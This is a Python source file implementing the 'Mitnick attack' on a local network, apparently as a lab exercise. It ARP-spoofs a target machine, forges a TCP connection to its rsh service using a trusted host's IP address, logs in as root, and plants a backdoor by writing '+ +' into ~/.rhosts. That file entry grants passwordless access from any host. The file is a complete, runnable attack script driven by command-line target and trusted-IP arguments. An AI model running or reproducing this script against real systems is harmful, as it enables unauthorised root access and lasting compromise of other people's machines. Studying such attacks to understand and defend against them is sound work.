"""Mitnick Attack in LAN."""
import argparse
import multiprocessing
import os
import sys
import time

import scapy.all as sc
from scapy.layers import inet, l2

RSH_PORT = 513
SEND_PORT = 1023


def get_mac_from_ip(interface: str, ip: str) -> str:
    """Get the MAC address of the machine with the specified 'ip'."""
    # Ping machine
    ping_res = os.system(f'ping -c 1 {ip} > /dev/null 2>&1')

    if ping_res != 0:
        return ''

    # Get machine's IP using the ARP table
    with os.popen(f'arp -n | grep {interface} | grep {ip} | tr -s " "'
                  ' | cut -d " "'
                  ' -f 3') as f:
        mac_addr = f.read().strip()

    return mac_addr


def get_ifname_and_mac_by_iprange(target_ip: str) -> tuple:
    """Get the MAC address from the interface matching the target IP."""
    ip_prefix = '.'.join(target_ip.split('.')[:2])

    with os.popen(f'ip r | grep "{ip_prefix}" | cut -d " " -f 3') as f:
        ifname = f.read().strip()

    if not ifname:
        return ()

    with os.popen(f'ip a show {ifname} | grep "link/ether" | tr -s " " |'
                  'cut -d " " -f 3') as f:
        mac_addr = f.read().strip()

    if not mac_addr:
        return ()

    return ifname, mac_addr


def arpspoof(mac_addr: str, target_ip: str, target_mac: str,
             trusted_ip: str) -> None:
    """Run the ARP Spoofing."""
    a = l2.ARP()
    a.op = 'is-at'

    # Target
    a.pdst = target_ip
    a.hwdst = target_mac

    # Trusted IP
    a.psrc = trusted_ip

    # Own MAC address
    a.hwsrc = mac_addr

    a.show()

    # Waits for its parent send SIGTERM
    while True:
        sc.send(a)
        time.sleep(1)


def send_ack(ip_packet, p, seq) -> None:
    """Send ACK to 'p' packet."""
    ack_n = p[inet.TCP].seq + len(p[sc.Raw])

    ack_packet = inet.TCP(sport=SEND_PORT,
                          dport=RSH_PORT,
                          flags='A',
                          ack=ack_n,
                          seq=seq)
    sc.send(ip_packet / ack_packet)

    return ack_n


def send_fin_ack(ip_packet, p, seq) -> None:
    """Send FIN ACK to 'p' packet."""
    ack_n = p[inet.TCP].seq + len(p[sc.Raw])

    ack_packet = inet.TCP(sport=SEND_PORT,
                          dport=RSH_PORT,
                          flags='FA',
                          ack=ack_n,
                          seq=seq)
    sc.send(ip_packet / ack_packet)

    return ack_n


def rsh_attack(target_ip: str, trusted_ip: str) -> None:
    """Run the Remote Shell attack."""
    # Base IP packet with spoofed source IP
    ip_packet = inet.IP(src=trusted_ip, dst=target_ip)

    # --- THREE-WAY HANDSHAKE
    seq = 1000
    print('Initiating TCP three-way handshake')
    syn_packet = inet.TCP(sport=SEND_PORT, dport=RSH_PORT, flags='S', seq=seq)
    synack = sc.sr1(ip_packet / syn_packet)

    seq += 1

    ack_packet = inet.TCP(sport=SEND_PORT,
                          dport=RSH_PORT,
                          flags='A',
                          ack=synack.seq + 1,
                          seq=seq)
    sc.send(ip_packet / ack_packet)
    print('Done')

    # --- REMOTE SHELL INIT
    print('Sending user info')
    data = "\000root\000root\000xterm/38400\000".encode()
    tcp_packet = inet.TCP(sport=SEND_PORT,
                          dport=RSH_PORT,
                          flags='PA',
                          ack=synack.seq + 1,
                          seq=seq)
    res = sc.sr1(ip_packet / tcp_packet / data)
    print('Done')

    seq += len(data)

    s = sc.L3RawSocket()

    while True:
        p = s.recv(sc.MTU)
        if p.haslayer(inet.TCP) and p.haslayer(
                sc.Raw) and p[inet.TCP].dport == SEND_PORT:
            if 'root@'.encode() in p.load:
                ack_n = send_ack(ip_packet, p, seq)
                break

    # --- REMOTE SHELL READY
    print('RSH init stablished, ready to send commands!')

    backdoor = 'echo "+ +" > ~/.rhosts\r'
    print(f'Sending backdoor: {backdoor}')

    # Send backdoor
    for char in backdoor:
        print(f'\tSending "{char}":')

        char_packet = inet.TCP(sport=SEND_PORT,
                               dport=RSH_PORT,
                               flags='PA',
                               ack=ack_n,
                               seq=seq)
        seq += 1

        res = sc.sr1(ip_packet / char_packet / char.encode())
        print('\t\tPacket sent and response received')

        send_ack(ip_packet, res, seq)
        print('\t\tACK sent')

    # Wait shell text and send ACK
    while True:
        p = s.recv(sc.MTU)
        if p.haslayer(inet.TCP) and p.haslayer(
                sc.Raw) and p[inet.TCP].dport == SEND_PORT:
            ack_n = send_ack(ip_packet, p, seq)
            break

    # Send logout request
    logout_code = '\004'
    logout_packet = inet.TCP(sport=SEND_PORT,
                             dport=RSH_PORT,
                             flags='PA',
                             ack=ack_n,
                             seq=seq)
    seq += 1

    res = sc.sr1(ip_packet / logout_packet / logout_code.encode())
    send_ack(ip_packet, res, seq)

    ack_n = res[inet.TCP].seq + len(res[sc.Raw])

    ack_packet = inet.TCP(sport=SEND_PORT,
                          dport=RSH_PORT,
                          flags='A',
                          ack=ack_n,
                          seq=seq)
    res = sc.sr1(ip_packet / ack_packet)

    send_fin_ack(ip_packet, res, seq)

    return


def main(target_ip: str, trusted_ip: str) -> None:
    """Run the Mitnick Attack."""
    print(f'Target IP: {target_ip}')
    print(f'Trusted IP: {trusted_ip}')

    res = get_ifname_and_mac_by_iprange(target_ip)

    if len(res) == 0:
        print('Error: could not get ifname & MAC address using the target IP')
        sys.exit(1)

    ifname, mac_addr = res

    print(f'Interface identified: {ifname}')
    print(f'MAC Address: {mac_addr}')

    target_mac = get_mac_from_ip(ifname, target_ip)

    if target_mac == '':
        print('Error: could not get target MAC address')
        sys.exit(1)

    print(f'Target MAC Address: {target_mac}')

    print('\nCalling ARP Spoof in another process...')
    arpspoof_proc = multiprocessing.Process(name='ArpSpoofThread',
                                            target=arpspoof,
                                            kwargs={
                                                'mac_addr': mac_addr,
                                                'target_ip': target_ip,
                                                'target_mac': target_mac,
                                                'trusted_ip': trusted_ip
                                            })
    arpspoof_proc.start()
    print('Done')

    print('\nInitiating attack...')
    rsh_attack(target_ip, trusted_ip)
    print('Done')

    arpspoof_proc.terminate()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing')

    parser.add_argument('--target_ip',
                        type=str,
                        required=True,
                        help='Target IP')

    parser.add_argument('--trusted_ip',
                        type=str,
                        required=True,
                        help='Trusted IP')

    args = parser.parse_args()

    main(args.target_ip, args.trusted_ip)
